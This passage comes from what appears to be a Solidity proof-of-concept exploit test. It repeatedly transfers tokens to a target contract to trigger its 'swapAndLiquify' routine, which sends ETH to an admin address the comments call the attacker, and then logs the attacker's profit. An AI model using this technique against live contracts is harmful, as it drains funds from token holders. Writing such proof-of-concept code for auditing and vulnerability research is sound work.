        target.transfer(TARGET, threshold);
        console.log("Contract token balance after 1st transfer:", target.balanceOf(TARGET));

        // Record initial ETH balance
        uint256 initialEth = address(attacker).balance;
        console.log("Initial ETH balance:", initialEth);

        // Trigger swapAndLiquify by transferring more tokens
        // This will cause contract to swap tokens and send ETH to admin (attacker)
        target.transfer(TARGET, threshold);

        // Check profit
        uint256 finalEth = address(attacker).balance;
        console.log("Final ETH balance:", finalEth);
        console.log("Profit:", finalEth - initialEth);

